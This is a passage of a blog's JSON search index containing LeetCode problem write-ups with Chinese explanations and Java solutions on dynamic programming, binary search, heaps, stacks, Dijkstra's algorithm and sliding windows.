n; j++) pathSums[i][j] += Math.min(pathSums[i - 1][j], pathSums[i][j - 1]); return pathSums[m - 1][n - 1];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"66. Plus One","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-66-Plus-One/","text":"Given a non-empty array of digits representing a non-negative integer, plus one to the integer. The digits are stored such that the most significant digit is at the head of the list, and each element in the array contain a single digit. You may assume the integer does not contain any leading zero, except the number 0 itself. Example 1: 123Input: [1,2,3]Output: [1,2,4]Explanation: The array represents the integer 123. Example 2: 123Input: [4,3,2,1]Output: [4,3,2,2]Explanation: The array represents the integer 4321. Java这道题目考查的是基本的数组操作和基本的数学加法。一般情况下，只要将数组最后元素加1即可。但是可能会出现进位的情况，所以需要注意进位的加法。特别需要注意的是当最高位进位时的情况。 12345678910111213141516171819public int[] plusOne(int[] digits) &#123; int carry = 1; for (int i = digits.length - 1; i &gt;= 0; i--) &#123; int newdigit = carry + digits[i]; if (newdigit &lt; 10) &#123; digits[i] = newdigit; return digits; &#125; else &#123; digits[i] = newdigit - 10; carry = 1; &#125; &#125; int[] digitsLarge = new int[digits.length + 1]; digitsLarge[0] = 1; for (int i = 0; i &lt; digits.length; i++) digitsLarge[i+1] = digits[i]; return digitsLarge;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"671. Second Minimum Node In a Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-671-Second-Minimum-Node-In-a-Binary-Tree/","text":"Given a non-empty special binary tree consisting of nodes with the non-negative value, where each node in this tree has exactly two or zero sub-node. If the node has two sub-nodes, then this node’s value is the smaller value among its two sub-nodes. Given such a binary tree, you need to output the second minimum value in the set made of all the nodes’ value in the whole tree. If no such second minimum value exists, output -1 instead. Example 1: 123456789Input: 2 / \\ 2 5 / \\ 5 7Output: 5Explanation: The smallest value is 2, the second smallest value is 5. Example 2: 1234567Input: 2 / \\ 2 2Output: -1Explanation: The smallest value is 2, but there isn&apos;t any second smallest value. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"687. Longest Univalue Path","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-687-Longest-Univalue-Path/","text":"Given a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root. Note: The length of path between two nodes is represented by the number of edges between them. Example 1: 123456789Input: 5 / \\ 4 5 / \\ \\ 1 1 5Output:2 Example 2: 12345678910Input: 1 / \\ 4 5 / \\ \\ 4 4 5Output:2 Note: The given binary tree has not more than 10000 nodes. The height of the tree is not more than 1000. Java这道题目和LeetCode 124. Binary Tree Maximum Path Sum整体思路是一样的。Q124求的是最大路径和，这道题目求的是最长路径。longestUnivaluePathHelper(root)返回的是从底往上到达root节点的最长路径。maxValue变量保存着最长路径。如果root节点的左子节点和右子节点和root节点的值相同，maxValue要增加，增加的长度和root节点与哪一部分节点相同有关。如果root节点和左右子节点的值都不同，则longestUnivaluePathHelper(root)返回0。 123456789101112131415161718private int maxValue;public int longestUnivaluePath(TreeNode root) &#123; maxValue = 0; longestUnivaluePathHelper(root); return maxValue;&#125;private int longestUnivaluePathHelper(TreeNode root) &#123; if (root == null) return 0; int left = longestUnivaluePathHelper(root.left); int right = longestUnivaluePathHelper(root.right); if (root.left != null &amp;&amp; root.val == root.left.val) left++; else left = 0; if (root.right != null &amp;&amp; root.val == root.right.val) right++; else right = 0; maxValue = Math.max(maxValue, left + right); return Math.max(left, right);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"746. Min Cost Climbing Stairs","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-746-Min-Cost-Climbing-Stairs/","text":"On a staircase, the i-th step has some non-negative cost cost[i] assigned (0 indexed). Once you pay the cost, you can either climb one or two steps. You need to find minimum cost to reach the top of the floor, and you can either start from the step with index 0, or the step with index 1. Example 1: 123Input: cost = [10, 15, 20]Output: 15Explanation: Cheapest is start on cost[1], pay that cost and go to the top. Example 2:123Input: cost = [1, 100, 1, 1, 1, 100, 1, 1, 100, 1]Output: 6Explanation: Cheapest is start on cost[0], and only step on 1s, skipping cost[3]. Note: cost will have a length in the range [2, 1000]. Every cost[i] will be an integer in the range [0, 999]. Java这道题目是LeetCode 70. Climbing Stairs的扩展，在Q70中需要求的是爬楼梯有多少种方法，这里求的是爬楼梯最小的费用。思路也是基本一致的：使用动态规划，爬到当前楼梯的最小费用minCost[i]等于爬到前一个楼梯的最小费用minCost[i - 1]，和前两个楼梯的最小费用inCost[i - 2]的较小值，加上走到当前楼梯的费用。 1234567public int minCostClimbingStairs(int[] cost) &#123; int [] minCost = new int[cost.length + 2]; int i = 2; for (; i &lt; minCost.length; i++) minCost[i] = cost[i - 2] + Math.min(minCost[i - 1], minCost[i - 2]); return Math.min(minCost[i - 1], minCost[i - 2]);&#125; 同样的，也可以省去中间结果： 123456789public int minCostClimbingStairs(int[] cost) &#123; int lastCost = 0, secondLastCost = 0, curCost = 0; for (int i = 2; i &lt; cost.length + 2; i++) &#123; curCost = cost[i - 2] + Math.min(lastCost, secondLastCost); secondLastCost = lastCost; lastCost = curCost; &#125; return Math.min(lastCost, secondLastCost);&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"69. Sqrt(x)","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-69-Sqrt-x/","text":"Implement int sqrt(int x). Compute and return the square root of $x$, where $x$ is guaranteed to be a non-negative integer. Since the return type is an integer, the decimal digits are truncated and only the integer part of the result is returned. Example 1: 12Input: 4Output: 2 Example 2: 1234Input: 8Output: 2Explanation: The square root of 8 is 2.82842..., and since the decimal part is truncated, 2 is returned. Java这道题目可以使用二分查找，唯一需要注意的就是整数值可能过大，所以这里当计算平方的时候采用double类型防止两个整数相乘溢出。 1234567891011public int mySqrt(int x) &#123; int lo = 1, hi = x; while (lo &lt;= hi) &#123; int mid = (lo + hi) &gt;&gt;&gt; 1; double cmp = ((double) mid)* mid - x; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return mid; &#125; return lo - 1;&#125; 在比较数字的时候，采用除法更好一些，避免了int类型的转换，和double类型的保存: 1234567891011public int mySqrt(int x) &#123; int lo = 1, hi = x; while (lo &lt;= hi) &#123; int mid = (lo + hi) &gt;&gt;&gt; 1; int cmp = mid - x/mid; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return mid; &#125; return lo - 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"70. Climbing Stairs","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-70-Climbing-Stairs/","text":"You are climbing a stair case. It takes $n$ steps to reach to the top. Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top? Note: Given $n$ will be a positive integer. Example 1: 12345Input: 2Output: 2Explanation: There are two ways to climb to the top.1. 1 step + 1 step2. 2 steps Example 2: 123456Input: 3Output: 3Explanation: There are three ways to climb to the top.1. 1 step + 1 step + 1 step2. 1 step + 2 steps3. 2 steps + 1 step Java这道题目考查的是基本的动态规划思想。设想你在楼梯的前$i$个台阶有numOfWays[i]种走法，那么前$i+1$个台阶有几种走法。分两种情况，可能此时你站在第$i$个台阶，那么向前一步即可；也有可能你站在第$i-1$个台阶，那么向前走两步即可。如果提前知道站在第$i$个台阶的走法数，和站在第$i-1$个台阶的走法数，那么把它们相加不就是前$i+1$个台阶的走法数。也就是 1numOfWays[i] = numOfWays[i - 1] + numOfWays[i - 2]; 根据上面的关系式，代码就非常简单了。 1234567public int climbStairs(int n) &#123; int[] numOfWays = new int[n+1]; numOfWays[0] = 1; numOfWays[1] = 1; for (int i = 2; i &lt; n + 1; i++) numOfWays[i] = numOfWays[i - 1] + numOfWays[i - 2]; return numOfWays[n];&#125; 可以不存储中间结果： 12345678910public int climbStairs(int n) &#123; if (n == 1) return 1; int last = 1, secondLast = 1, now = 0; for (int i = 2; i &lt; n + 1; i++) &#123; now = last + secondLast; secondLast = last; last = now; &#125; return now;&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"703. Kth Largest Element in a Stream","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-703-Kth-Largest-Element-in-a-Stream/","text":"Design a class to find the kth largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element. Your KthLargest class will have a constructor which accepts an integer k and an integer array nums, which contains initial elements from the stream. For each call to the method KthLargest.add, return the element representing the kth largest element in the stream. Example: 12345678int k = 3;int[] arr = [4,5,8,2];KthLargest kthLargest = new KthLargest(3, arr);kthLargest.add(3); // returns 4kthLargest.add(5); // returns 5kthLargest.add(10); // returns 5kthLargest.add(9); // returns 8kthLargest.add(4); // returns 8 Note:You may assume that nums’ length $≥ k-1$ and $k ≥ 1$. Java首先最简单的方法是，对整个数组进行排序，然后通过数组下标索引并返回该元素。时间复杂度是$O(n\\log n)$，空间复杂度是$O(1)$. 1234public int findKthLargest(int[] nums, int k) &#123; Arrays.sort(nums); return nums[nums.length - k];&#125; 其次，很自然的想到使用二叉堆处理最大值。在Java中二叉堆可以用PriorityQueue来表示，首先将数组元素依次加入到二叉堆中，然后连续取$k$次最大值即可，第$k$次的返回结果就是第$k$大的值。时间复杂度是$O(n\\log n)$，空间复杂度是$O(n)$. 12345678public int findKthLargest(int[] nums, int k) &#123; PriorityQueue&lt;Integer&gt; heap = new PriorityQueue&lt;Integer&gt;( nums.length, Collections.reverseOrder()); // 注意堆的顺序reverse heap.addAll(Arrays.asList(num)); // 加入所有元素到堆中 for (int i = 0; i &lt; k - 1; i ++) heap.poll(); return heap.poll();&#125; 但是以上的两种方法都不能应用，原因就在于除了findKthLargest方法，还需要实现add方法来添加元素。如果使用方法一，则每一次添加都需要重新排序；如果使用方法二，则每一次添加都需要重新加入所有元素到二叉堆中。算法的时间复杂度达到了$)(n^2)$以上。 所以必须改进以上两种方法。首先比较简单的，改进二叉堆：始终维持二叉堆的大小为$k$，当二叉堆的大小超过$k$时，删除最小值。时间复杂度是$O(n\\log k)$，空间复杂度是$O(n)$. 12345678910111213141516private PriorityQueue&lt;Integer&gt; hp;private int k;public KthLargest(int k, int[] nums) &#123; this.k = k; hp = new PriorityQueue&lt;&gt;(); // 最小二叉堆 for (int num : nums) &#123; hp.offer(num); // 加入元素 if (hp.size() &gt; k) hp.poll(); // 删除最小值 &#125;&#125; public int add(int val) &#123; hp.offer(val); if (hp.size() &gt; k) hp.poll(); return hp.peek();&#125; 其次改进排序的方法：快速选择(quick select)算法，线性时间复杂度！ 123456789101112131415161718192021222324252627282930313233343536373839404142public int findKthLargest(int[] nums, int k) &#123; k = nums.length - k; int lo = 0; int hi = nums.length - 1; while (lo &lt; hi) &#123; final int j = partition(nums, lo, hi); if (j &lt; k) &#123; lo = j + 1; &#125; else if (j &gt; k) &#123; hi = j - 1; &#125; else &#123; break; &#125; &#125; return nums[k];&#125;private int partition(int[] a, int lo, int hi) &#123; int i = lo; int j = hi + 1; while(true) &#123; while(i &lt; hi &amp;&amp; less(a[++i], a[lo])); while(j &gt; lo &amp;&amp; less(a[lo], a[--j])); if(i &gt;= j) &#123; break; &#125; exch(a, i, j); &#125; exch(a, lo, j); return j;&#125;private void exch(int[] a, int i, int j) &#123; final int tmp = a[i]; a[i] = a[j]; a[j] = tmp;&#125;private boolean less(int v, int w) &#123; return v &lt; w;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"71. Simplify Path","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-71-Simplify-Path/","text":"Given an absolute path for a file (Unix-style), simplify it. For example, path = &quot;/home/&quot;, =&gt; &quot;/home&quot;path = &quot;/a/./b/../../c/&quot;, =&gt; &quot;/c&quot; Corner Cases: Did you consider the case where path = &quot;/../&quot;? In this case, you should return &quot;/&quot;. Another corner case is the path might contain multiple slashes &#39;/&#39; together, such as &quot;/home//foo/&quot;. In this case, you should ignore redundant slashes and return &quot;/home/foo&quot;. 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Given an absolute path for a file (Unix-style), simplify it. * * https://leetcode.com/problems/simplify-path/description/ * * 使用stack处理，需要注意得是可能会出现\"/..\"的情况， * 所以要判断stack.isEmpty()； * 也需要注意空的情况，需要判断stack.size()==0。 * * * */public class Q71SimplifyPath &#123; public static String simplifyPath(String path) &#123; Stack&lt;String&gt; stack = new Stack&lt;&gt;(); for (String s: path.split(\"/\")) &#123; switch (s) &#123; case \"\": break; case \".\": break; case \"..\": if (!stack.isEmpty()) stack.pop(); break; default: stack.push(s); break; &#125; &#125; if (stack.size()==0) &#123; return \"/\"; &#125; StringBuilder newPath = new StringBuilder(); for (String s: stack) &#123; newPath.append(\"/\"); newPath.append(s); &#125; return newPath.toString(); &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"74. Search a 2D Matrix","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-74-Search-a-2D-Matrix/","text":"Write an efficient algorithm that searches for a value in an $m \\times n$ matrix. This matrix has the following properties: Integers in each row are sorted from left to right. The first integer of each row is greater than the last integer of the previous row. Example 1: 12345678Input:matrix = [ [1, 3, 5, 7], [10, 11, 16, 20], [23, 30, 34, 50]]target = 3Output: true Example 2: 12345678Input:matrix = [ [1, 3, 5, 7], [10, 11, 16, 20], [23, 30, 34, 50]]target = 13Output: false Java看到这道题目的时候，看到搜索，首先联想到是二分法。但是一般情况下，使用二分法的对象是一维数组，这里的二维数组怎么处理呢？一种直接的想法就是，首先找到目标所在的行，然后找到所在的列。时间复杂度是$O(\\log(m) + \\log(n))$。过程中需要特别注意出现空数组([[ ]], [ ])的情况。 12345678910111213141516171819202122232425262728293031323334353637public boolean searchMatrix(int[][] matrix, int target) &#123; int m = matrix.length; if (m == 0) return false; int n = matrix[0].length; if (n == 0) return false; //find row int row; int lo = 0, hi = m - 1; while (lo &lt;= hi) &#123; int mid = (hi + lo) &gt;&gt;&gt; 1; int cmp = matrix[mid][n - 1] - target; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return true; &#125; row = lo; // check row if (row &gt; m - 1) return false; //find column int col; lo = 0; hi = n - 1; while (lo &lt;= hi) &#123; int mid = (hi + lo) &gt;&gt;&gt; 1; int cmp = matrix[row][mid] - target; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return true; &#125; col = lo - 1; return false;&#125; 但是这种写法，真的有点复杂，而且非常容易出错，反正我写的过程中出现了不少小的错误。有没有更简单、更直接的方法呢？当然是有的！直接把二维数组看成是一维数组，唯一需要变动的是lo, hi和下标的处理: 12345int lo = 0;int hi = m * n - 1;int mid = (lo + hi) &gt;&gt;&gt; 1;// accessmatrix[mid/n][mid%n] 完整的代码如下： 它的算法复杂度和第一种方案一样，也是$O(\\log(mn))$. 12345678910111213141516public boolean searchMatrix(int[][] matrix, int target) &#123; int m = matrix.length; if (m == 0) return false; int n = matrix[0].length; if (n == 0) return false; int lo = 0, hi = m*n - 1; while (lo &lt;= hi) &#123; int mid = (lo + hi) &gt;&gt;&gt; 1; int cmp = matrix[mid/n][mid%n] - target; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return true; &#125; return false;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"728. Self Dividing Numbers","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-728-Self-Dividing-Numbers/","text":"A self-dividing number is a number that is divisible by every digit it contains. For example, 128 is a self-dividing number because 128 % 1 == 0, 128 % 2 == 0, and 128 % 8 == 0. Also, a self-dividing number is not allowed to contain the digit zero. Given a lower and upper number bound, output a list of every possible self dividing number, including the bounds if possible. Example 1: 123Input: left = 1, right = 22Output: [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 15, 22] Note: The boundaries of each input argument are 1 &lt;= left &lt;= right &lt;= 10000. Java考察数字的基本操作。 123456789101112131415public List&lt;Integer&gt; selfDividingNumbers(int left, int right) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); for (int num = left; num &lt;= right; num++) &#123; if (num &lt; 10) &#123;res.add(num); continue;&#125; int numCopy = num; while (numCopy != 0) &#123; int digit = numCopy % 10; if (digit == 0) break; if (num % digit != 0) break; numCopy /= 10; &#125; if (numCopy == 0) res.add(num); &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"741. Cherry Pickup","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-741-Cherry-Pickup/","text":"In a $N \\times N$ grid representing a field of cherries, each cell is one of three possible integers. 0 means the cell is empty, so you can pass through; 1 means the cell contains a cherry, that you can pick up and pass through; -1 means the cell contains a thorn that blocks your way. Your task is to collect maximum number of cherries possible by following the rules below: Starting at the position (0, 0) and reaching (N-1, N-1) by moving right or down through valid path cells (cells with value 0 or 1); After reaching (N-1, N-1), returning to (0, 0) by moving left or up through valid path cells; When passing through a path cell containing a cherry, you pick it up and the cell becomes an empty cell (0); If there is no valid path between (0, 0) and (N-1, N-1), then no cherries can be collected. Example 1: 12345678910Input: grid =[[0, 1, -1], [1, 0, -1], [1, 1, 1]]Output: 5Explanation: The player started at (0, 0) and went down, down, right right to reach (2, 2).4 cherries were picked up during this single trip, and the matrix becomes [[0,1,-1],[0,0,-1],[0,0,0]].Then, the player went left, up, up, left to return home, picking up one more cherry.The total number of cherries picked up is 5, and this is the maximum possible. Note: grid is an N by N 2D array, with 1 &lt;= N &lt;= 50. Each grid[i][j] is an integer in the set {-1, 0, 1}. It is guaranteed that grid[0][0] and grid[N-1][N-1] are not -1. Java","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"743. Network Delay Time","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-743-Network-Delay-Time/","text":"There are $N$ network nodes, labelled 1 to $N$. Given times, a list of travel times as directed edges times[i] = (u, v, w), where $u$ is the source node, $v$ is the target node, and $w$ is the time it takes for a signal to travel from source to target. Now, we send a signal from a certain node $K$. How long will it take for all nodes to receive the signal? If it is impossible, return -1. Note: $N$ will be in the range [1, 100]. $K$ will be in the range [1, $N$]. The length of times will be in the range [1, 6000]. All edges times[i] = ($u, v, w$) will have $1 &lt;= u, v &lt;= N and 1 &lt;= w &lt;= 100$. Java这道题目思路是非常直接的。题目都说了有向图directed graph，并且需要求最长的最短路径。那么就是题目就转化为shortest path of directed graph. 由于所有路径都为正数，可以使用经典的Dijkstra’s algorithm. 123456789101112131415161718192021222324252627282930313233343536public int networkDelayTime(int[][] times, int N, int K) &#123; int[] distTo = new int[N + 1]; PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;((o1, o2)-&gt;o1[1]-o2[1]); Arrays.fill(distTo, Integer.MAX_VALUE); //construct graph Map&lt;Integer, Integer&gt;[] graph = (HashMap&lt;Integer, Integer&gt;[]) new HashMap&lt;?, ?&gt;[N + 1]; for (int i = 1; i &lt; N + 1; i++) graph[i] = new HashMap&lt;&gt;(); for (int[] time : times) graph[time[0]].put(time[1], time[2]); // dijkstra algorithm distTo[K] = 0; pq.offer(new int[]&#123;K, distTo[K]&#125;); while (!pq.isEmpty()) &#123; int v = pq.poll()[0]; Map&lt;Integer, Integer&gt; distFromV = graph[v]; for (int w : distFromV.keySet()) if (distTo[w] &gt; distTo[v] + distFromV.get(w)) &#123; pq.remove(new int[]&#123;w, distTo[w]&#125;); distTo[w] = distTo[v] + distFromV.get(w); pq.offer(new int[]&#123;w, distTo[w]&#125;); &#125; &#125; // find min int maxLength = -1; for (int i = 1; i &lt;= N; i++) if (distTo[i] == Integer.MAX_VALUE) return -1; else if (i != K &amp;&amp; distTo[i] &gt; maxLength) maxLength = distTo[i]; return maxLength;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"172. Factorial Trailing Zeroes","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-172-Factorial-Trailing-Zeroes/","text":"Given an integer $n$, return the number of trailing zeroes in $n!$. Example 1: 123Input: 3Output: 0Explanation: 3! = 6, no trailing zero. Example 2: 123Input: 5Output: 1Explanation: 5! = 120, one trailing zero. Note: Your solution should be in logarithmic time complexity. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"426. Convert Binary Search Tree to Sorted Doubly Linked List","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-426-Convert-Binary-Search-Tree-to-Sorted-Doubly-Linked-List/","text":"Convert a binary search tree to doubly linked list with in-order traversal. Example 12345678Given a binary search tree: 4 / \\ 2 5 / \\1 3 return 1&lt;-&gt;2&lt;-&gt;3&lt;-&gt;4&lt;-&gt;5 Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"LinkedList","slug":"LinkedList","permalink":"http://larryim.cc/tags/LinkedList/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"76. Minimum Window Substring","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-76-Minimum-Window-Substring/","text":"Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity $O(n)$. Example: 12Input: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;Output: &quot;BANC&quot; Note: If there is no such window in $S$ that covers all characters in $T$, return the empty string &quot;&quot;. If there is such window, you are guaranteed that there will always be only one unique minimum window in $S$. Java滑动窗口题，该题型出现在字符串中，往往涉及两个字符串。既然是滑动窗口，那必然需要左指针和右指针维持滑动窗口的位置。不断移动左指针和右指针，直到右指针移动到字符串末尾。可以用一个哈希表map存储需要匹配的每个不同字符的个数，用required表示需要匹配的不同字符个数。当右指针指向的字符匹配时，将map中相应的匹配的字符个数减去1；当该字符的需要匹配数等于0时，也就是该字符已完成匹配，把required减去1。当required等于1时，也就是所有字符都匹配完成时，这个滑动窗口就是匹配的窗口，这时试图移动左指针向前，直到该滑动窗口不再匹配。重复上述过程，可以寻找到最小的窗口。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public String minWindow(String s, String t) &#123; if (s == null || t == null || s.length() == 0 || t.length() == 0) return \"\"; // 哈希表保存所有的t中不同字符的个数 Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;(); for (char c : t.toCharArray()) map.put(c, map.getOrDefault(c, 0) + 1); // t中不同字符的个数，即滑动窗口中需要匹配的不同字符个数 // 当required = 0， 即完成匹配 int required = map.size(); // 左右指针 int l = 0, r = 0; // 窗口长度，窗口的左边 int minLength = Integer.MAX_VALUE, minLeft = 0; while (r &lt; s.length()) &#123; // 把当前字符加入到窗口中 char c = s.charAt(r); if (map.containsKey(c)) map.put(c, map.getOrDefault(c, 0) - 1); // 如果当前字符在滑动窗口中的出现的个数等于需要的个数，那么把需要匹配的字符数required减去1 if (map.containsKey(c) &amp;&amp; map.get(c) == 0) required--; // 尝试收缩滑动窗口，直到最佳 while (required == 0) &#123; c = s.charAt(l); // 保存当前窗口 if (r - l + 1 &lt; minLength) &#123; minLength = r - l + 1; minLeft = l; &#125; // 由于窗口缩小了，需要最左边字符的数量加1 if (map.containsKey(c)) map.put(c, map.get(c) + 1); // 字符数量不等于0，表明需要匹配的字符数required加1，滑动窗口不再符合 if (map.containsKey(c) &amp;&amp; map.get(c) &gt; 0) required++; // 移动左指针向前，寻找一个新的窗口 l++; &#125; // 当收缩窗口完成以后，继续扩展窗口 r++; &#125; return minLength == Integer.MAX_VALUE ? \"\" : s.substring(minLeft, minLeft + minLength);&#125; 值得注意的是其实if (map.containsKey(c))这个判断可以去掉，因为如果$t$中不出现的字符加入的话，由于起始值为0，所以其在哈希表中的值始终为负，不影响判断。 有没有更快的方法？其实所有用哈希表存储字符的题目都可以用整型数组int[] array代替HashMap: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public String minWindow(String s, String t) &#123; if (s == null || t == null || s.length() == 0 || t.length() == 0) return \"\"; // 哈希表保存所有的t中所有的字符的计数 int [] map = new int[128]; for (char c : t.toCharArray()) map[c]++; // t中字符的数量，窗口中需要匹配的字符数 int required = 0; for (int i : map) if (i &gt; 0) required++; // 左右指针 int l = 0, r = 0; // 窗口长度，窗口的左边 int minLength = Integer.MAX_VALUE, minLeft = 0; while (r &lt; s.length()) &#123; // 把当前字符加入到窗口中 char c = s.charAt(r); map[c]--; // 如果当前字符在滑动窗口中的出现的个数等于需要的个数，那么把需要匹配的字符数required减去1 if (map[c] == 0) required--; // 尝试收缩滑动窗口，直到最佳 while (required == 0) &#123; c = s.charAt(l); // 保存当前窗口 if (r - l + 1 &lt; minLength) &#123; minLength = r - l + 1; minLeft = l; &#125; // 由于窗口缩小了，需要最左边字符的数量加1 map[c]++; // 字符数量不等于0，表明需要匹配的字符数required加1，滑动窗口不再符合 if (map[c] &gt; 0) required++; // 移动左指针向前，寻找一个新的窗口 l++; &#125; // 当收缩窗口完成以后，继续扩展窗口 r++; &#125; return minLength == Integer.MAX_VALUE ? \"\" : s.substring(minLeft, minLeft + minLength);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Two 